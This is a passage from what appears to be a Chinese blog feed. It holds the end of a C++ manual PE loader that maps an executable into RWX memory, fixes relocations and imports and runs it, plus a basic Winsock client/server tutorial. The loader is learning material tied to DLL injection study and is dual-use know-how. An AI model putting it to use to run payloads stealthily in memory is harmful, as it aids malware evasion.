class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">PEdata</span> &#123;</span><br><span class="line">PIMAGE_DOS_HEADER dosHeader;</span><br><span class="line">PIMAGE_NT_HEADERS ntHeader;</span><br><span class="line">PIMAGE_FILE_HEADER fileHeader;</span><br><span class="line">PIMAGE_OPTIONAL_HEADER optionalHeader;</span><br><span class="line"></span><br><span class="line"><span class="comment">//内存映像整大小</span></span><br><span class="line"><span class="type">size_t</span> memSize;</span><br><span class="line"><span class="comment">//PE头映像大小</span></span><br><span class="line"><span class="type">size_t</span> memHeaderSize;</span><br><span class="line"><span class="comment">//节区映像大小</span></span><br><span class="line"><span class="type">size_t</span> sectionAlignment;</span><br><span class="line"></span><br><span class="line"><span class="comment">//内存起始地址</span></span><br><span class="line">DWORD64 imageBase;</span><br><span class="line">&#125;pedata;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">loadPEstruct</span><span class="params">(BYTE* rawdata)</span> </span>&#123;</span><br><span class="line">pedata.dosHeader = (PIMAGE_DOS_HEADER)rawdata;</span><br><span class="line">pedata.ntHeader = (PIMAGE_NT_HEADERS)(rawdata + pedata.dosHeader-&gt;e_lfanew);</span><br><span class="line">pedata.fileHeader = &amp;(pedata.ntHeader-&gt;FileHeader);</span><br><span class="line">pedata.optionalHeader = &amp;(pedata.ntHeader-&gt;OptionalHeader);</span><br><span class="line"></span><br><span class="line">pedata.imageBase = pedata.optionalHeader-&gt;ImageBase;</span><br><span class="line">pedata.memSize = pedata.optionalHeader-&gt;SizeOfImage;</span><br><span class="line">pedata.memHeaderSize = pedata.optionalHeader-&gt;SizeOfHeaders;</span><br><span class="line">pedata.sectionAlignment = pedata.optionalHeader-&gt;SectionAlignment;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">std::unique_ptr&lt;BYTE[]&gt; <span class="title">mapToMemory</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* filePath)</span> </span>&#123;</span><br><span class="line">FILE* file;</span><br><span class="line"><span class="type">errno_t</span> err = <span class="built_in">fopen_s</span>(&amp;file, filePath, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (err != <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fseek</span>(file, <span class="number">0</span>, SEEK_END);</span><br><span class="line"><span class="type">size_t</span> fileSize = <span class="built_in">ftell</span>(file);</span><br><span class="line"><span class="built_in">fseek</span>(file, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line"><span class="function">std::unique_ptr&lt;BYTE[]&gt; <span class="title">fileData</span><span class="params">(<span class="keyword">new</span> BYTE[fileSize])</span></span>;</span><br><span class="line"><span class="keyword">if</span> (!fileData) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fread</span>(fileData.<span class="built_in">get</span>(), <span class="number">1</span>, fileSize, file);</span><br><span class="line"><span class="built_in">fclose</span>(file);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;成功申请内存: 0x%llX\n&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(fileData.<span class="built_in">get</span>()));</span><br><span class="line"><span class="keyword">return</span> fileData;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">makeHeadandSectionMap</span><span class="params">(LPVOID memBase, <span class="type">const</span> BYTE* fileBase)</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------开始映射节区--------\n&quot;</span>);</span><br><span class="line"><span class="built_in">RtlMoveMemory</span>(memBase, fileBase, pedata.memHeaderSize);</span><br><span class="line"></span><br><span class="line">PIMAGE_SECTION_HEADER sectionHeader = <span class="built_in">IMAGE_FIRST_SECTION</span>(pedata.ntHeader);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pedata.fileHeader-&gt;NumberOfSections; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (sectionHeader[i].VirtualAddress == <span class="number">0</span> &amp;&amp; sectionHeader[i].SizeOfRawData == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">LPVOID srcMem = (LPVOID)(fileBase + sectionHeader[i].PointerToRawData);</span><br><span class="line">LPVOID dstMem = (BYTE*)memBase + sectionHeader[i].VirtualAddress;</span><br><span class="line"><span class="type">size_t</span> sizeOfRawData = sectionHeader[i].SizeOfRawData;</span><br><span class="line"><span class="built_in">RtlCopyMemory</span>(dstMem, srcMem, sizeOfRawData);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - 节区%d: %s, 映射到内存 0x%llX\n&quot;</span>, i, sectionHeader[i].Name, <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(dstMem));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------映射节区结束--------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">repareReloc</span><span class="params">(LPVOID memBase)</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;------开始修复重定位表-------\n&quot;</span>);</span><br><span class="line">PIMAGE_BASE_RELOCATION relTable = (PIMAGE_BASE_RELOCATION)((BYTE*)memBase + pedata.optionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);</span><br><span class="line"><span class="type">size_t</span> delta = <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(memBase) - pedata.optionalHeader-&gt;ImageBase;</span><br><span class="line"><span class="keyword">if</span> (relTable == <span class="literal">nullptr</span> || delta == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (relTable-&gt;SizeOfBlock != <span class="number">0</span> &amp;&amp; relTable-&gt;VirtualAddress != <span class="number">0</span>) &#123;</span><br><span class="line">WORD* pRdata = (WORD*)((BYTE*)relTable + <span class="built_in">sizeof</span>(IMAGE_BASE_RELOCATION));</span><br><span class="line"><span class="type">size_t</span> dataNum = (relTable-&gt;SizeOfBlock - <span class="built_in">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="built_in">sizeof</span>(WORD);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - 表%d:\n&quot;</span>, j);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; dataNum; i++) &#123;</span><br><span class="line">DWORD type = pRdata[i] &gt;&gt; <span class="number">12</span>;</span><br><span class="line"><span class="keyword">if</span> (type == IMAGE_REL_BASED_DIR64) &#123;</span><br><span class="line">DWORD64* targetAddress = (DWORD64*)((BYTE*)memBase + relTable-&gt;VirtualAddress + (pRdata[i] &amp; <span class="number">0xFFF</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - 对应地址: 0x%llX 数据: 0x%llX\n&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(targetAddress), *targetAddress);</span><br><span class="line">*targetAddress += delta;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   -&gt; 0x%llX  delta: 0x%llX\n&quot;</span>, *targetAddress, delta);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">relTable = (PIMAGE_BASE_RELOCATION)((BYTE*)relTable + relTable-&gt;SizeOfBlock);</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;------修复重定位表结束-------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">repareIAT</span><span class="params">(LPVOID memBase)</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------开始修复IAT--------\n&quot;</span>);</span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)memBase + pedata.optionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);</span><br><span class="line"><span class="keyword">while</span> (importDesc-&gt;OriginalFirstThunk) &#123;</span><br><span class="line"><span class="type">char</span>* Dllname = (<span class="type">char</span>*)((BYTE*)memBase + importDesc-&gt;Name);</span><br><span class="line">HMODULE hDll = <span class="built_in">GetModuleHandleA</span>(Dllname);</span><br><span class="line"><span class="keyword">if</span> (!hDll) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - 加载DLL:%s\n&quot;</span>, Dllname);</span><br><span class="line">hDll = <span class="built_in">LoadLibraryA</span>(Dllname);</span><br><span class="line"><span class="keyword">if</span> (!hDll) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - 加载DLL失败,导入函数终止\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; - DLL已存在:%s\n&quot;</span>, Dllname);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_THUNK_DATA INT = (PIMAGE_THUNK_DATA)((BYTE*)memBase + importDesc-&gt;OriginalFirstThunk);</span><br><span class="line">PIMAGE_THUNK_DATA IAT = (PIMAGE_THUNK_DATA)((BYTE*)memBase + importDesc-&gt;FirstThunk);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; INT[i].u1.AddressOfData; i++) &#123;</span><br><span class="line">DWORD64 pFunc = <span class="literal">NULL</span>;</span><br><span class="line">DWORD64 targetFunc = <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;((BYTE*)memBase + INT[i].u1.AddressOfData);</span><br><span class="line"><span class="keyword">if</span> (targetFunc &amp; IMAGE_ORDINAL_FLAG) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - 以序号:%d 导入函数\n&quot;</span>, <span class="built_in">IMAGE_ORDINAL</span>(targetFunc));</span><br><span class="line">pFunc = (DWORD64)<span class="built_in">GetProcAddress</span>(hDll, <span class="built_in">MAKEINTRESOURCEA</span>(<span class="built_in">IMAGE_ORDINAL</span>(targetFunc)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - 以名称:%s 导入函数\n&quot;</span>, ((PIMAGE_IMPORT_BY_NAME)targetFunc)-&gt;Name);</span><br><span class="line">pFunc = (DWORD64)<span class="built_in">GetProcAddress</span>(hDll, ((PIMAGE_IMPORT_BY_NAME)targetFunc)-&gt;Name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (pFunc) &#123;</span><br><span class="line">IAT[i].u1.Function = pFunc;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - 函数导入成功\n   - 目的地址: 0x%llX\n&quot;</span>, pFunc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;   - 函数导入失败\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">importDesc++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------修复IAT结束--------\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">setImageBase</span><span class="params">(LPVOID memBase)</span> </span>&#123;</span><br><span class="line">IMAGE_DOS_HEADER* dosHeader = (PIMAGE_DOS_HEADER)memBase;</span><br><span class="line">IMAGE_NT_HEADERS* ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)memBase + dosHeader-&gt;e_lfanew);</span><br><span class="line">ntHeader-&gt;OptionalHeader.ImageBase = <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(memBase);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------修正镜像基地址成功--------\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* targetPath = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line"></span><br><span class="line">std::unique_ptr&lt;BYTE[]&gt; fileBase = <span class="built_in">mapToMemory</span>(targetPath);</span><br><span class="line"><span class="keyword">if</span> (!fileBase) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">loadPEstruct</span>(fileBase.<span class="built_in">get</span>());</span><br><span class="line"></span><br><span class="line">LPVOID memBase = <span class="built_in">VirtualAllocEx</span>(<span class="built_in">GetCurrentProcess</span>(), <span class="literal">nullptr</span>, pedata.memSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (!memBase) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">makeHeadandSectionMap</span>(memBase, fileBase.<span class="built_in">get</span>());</span><br><span class="line"><span class="built_in">repareReloc</span>(memBase);</span><br><span class="line"><span class="built_in">repareIAT</span>(memBase);</span><br><span class="line"><span class="built_in">setImageBase</span>(memBase);</span><br><span class="line"></span><br><span class="line">DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">VirtualProtectEx</span>(<span class="built_in">GetCurrentProcess</span>(), memBase, pedata.memSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;开始执行\n&quot;</span>);</span><br><span class="line"><span class="keyword">auto</span> targetFunc = <span class="built_in">reinterpret_cast</span>&lt;<span class="built_in">int</span>(*)(<span class="type">void</span>)&gt;((BYTE*)memBase + ((PIMAGE_NT_HEADERS)((BYTE*)memBase + ((PIMAGE_DOS_HEADER)memBase)-&gt;e_lfanew))-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line"><span class="built_in">targetFunc</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(<span class="built_in">GetCurrentProcess</span>(), memBase, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="目前未解决的问题">目前未解决的问题</h2><ul><li>对DLL的载入，下次学反射DLL注入的时候试试</li><li>若文件本身有UPX等壳，修正的所有内容均为壳的内容，壳解压后并不能还原PE本身的映射到偏移地址，导致报错</li></ul>]]></content>
      
      
      <categories>
          
          <category> 逆向工程核心原理 </category>
          
          <category> 实践 </category>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 逆向 </category>
          
          <category> 技能 </category>
          
          <category> DLL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络编程1-CS模型</title>
      <link href="/posts/7e127f51.html"/>
      <url>/posts/7e127f51.html</url>
      
        <content type="html"><![CDATA[<h2 id="CS模型">CS模型</h2><p>Client/Server模型，客户端和服务端模型，服务端程序在服务器上一直开放，等待客户端程序接入。客户端程序在用户电脑上执行，打开后主动给服务端发送请求，然后建立连接，相互通信，直到服务端或客户端取消连接。</p><h3 id="套接字">套接字</h3><p>socket：英文原意是插座。它是TCP协议的端口，由于TCP提供的是点对点通信，因此每条TCP连接都由一组套接字确定。socket介于应用层和传输层之间，通过IP实现主机间的交流，通过port实现应用之间的交流。</p><h4 id="定义">定义</h4><p>$$<br>socket = (IP:port)<br>$$</p><p>$$<br>TCP连接 ::={socket_1,socket_2}<br>$$</p><p>其中的两个socket分别为客户端和服务端的ip与端口号。</p><h4 id="分类">分类</h4><ul><li>流式套接字：用于TCP</li><li>数据包套接字：用于UDP</li><li>原始套接字：用于自定义底层协议</li></ul><h4 id="CPP实现方法">CPP实现方法</h4><p>Windows中，使用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;WinSock2.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>来使用套接字</p><h3 id="CS具体内容">CS具体内容</h3><p>服务端和客户端分别建立套接字，设定对应ip和port</p><p>服务端等待连接，客户端请求连接</p><p>连接成功后，相互发送消息到缓冲区</p><p>结束后关闭。</p><p><img src="https://s2.loli.net/2024/12/13/BKviqpCyVWOrLNt.png" alt="网上找的"></p><h3 id="CPP实现">CPP实现</h3><p>socket函数，创建socket并设定模式，这里使用TCP</p><p>bind函数，绑定socket到ip:port上</p><p>listen函数，服务器监听对应端口有无信息</p><p>accept函数无限等待连接，获取客户端套接字，返回后表示连接成功，connect函数请求连接</p><p>recv函数接收数据，send函数发送数据</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//client</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;WS2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">WSADATA data;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;data))<span class="comment">//用于初始化库函数</span></span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;WSAdata初始化失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SOCKET cSocket = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (cSocket == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;套接字创建失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sockaddr_in saddr;</span><br><span class="line">saddr.sin_family = AF_INET;</span><br><span class="line"><span class="built_in">InetPton</span>(AF_INET, <span class="string">L&quot;127.0.0.1&quot;</span>, &amp;saddr.sin_addr);<span class="comment">//将本地数据转换为网络端序（大端序）</span></span><br><span class="line"></span><br><span class="line">saddr.sin_port = <span class="built_in">htons</span>(<span class="number">4567</span>);<span class="comment">//同上，端口可自行指定</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">connect</span>(cSocket, (SOCKADDR*)&amp;saddr, <span class="built_in">sizeof</span>(saddr)) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;连接到服务器失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">closesocket</span>(cSocket);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* sendData = <span class="string">&quot;Hello,world&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">send</span>(cSocket, sendData, <span class="built_in">strlen</span>(sendData), <span class="number">0</span>) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;发送数据失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">closesocket</span>(cSocket);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">closesocket</span>(cSocket);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//server</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">WSADATA data;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;data))</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;WSAdata初始化失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SOCKET sSocket = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (sSocket == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;套接字创建失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sockaddr_in saddr;</span><br><span class="line">saddr.sin_family = AF_INET;</span><br><span class="line">saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">saddr.sin_port = <span class="built_in">htons</span>(<span class="number">4567</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">bind</span>(sSocket, (SOCKADDR*)&amp;saddr, <span class="built_in">sizeof</span>(saddr)) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;绑定失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">closesocket</span>(sSocket);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">listen</span>(sSocket, SOMAXCONN) == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;监听失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">closesocket</span>(sSocket);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SOCKET cSocket;</span><br><span class="line">sockaddr_in caddr;</span><br><span class="line"><span class="type">int</span> addrSize = <span class="built_in">sizeof</span>(caddr);</span><br><span class="line">cSocket = <span class="built_in">accept</span>(sSocket, (SOCKADDR*)&amp;caddr, &amp;addrSize);</span><br><span class="line"><span class="keyword">if</span> (cSocket == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;接受连接失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="built_in">closesocket</span>(sSocket);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> recvbuf[<span class="number">512</span>];</span><br><span class="line"><span class="type">int</span> bytesReceived;</span><br><span class="line"><span class="keyword">while</span> ((bytesReceived = <span class="built_in">recv</span>(cSocket, recvbuf, <span class="built_in">sizeof</span>(recvbuf) - <span class="number">1</span>, <span class="number">0</span>)) &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">recvbuf[bytesReceived] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">std::cout &lt;&lt; recvbuf &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (bytesReceived == SOCKET_ERROR)</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;接收数据失败&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">closesocket</span>(cSocket);</span><br><span class="line"><span class="built_in">closesocket</span>(sSocket);</span><br><span class="line"><span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
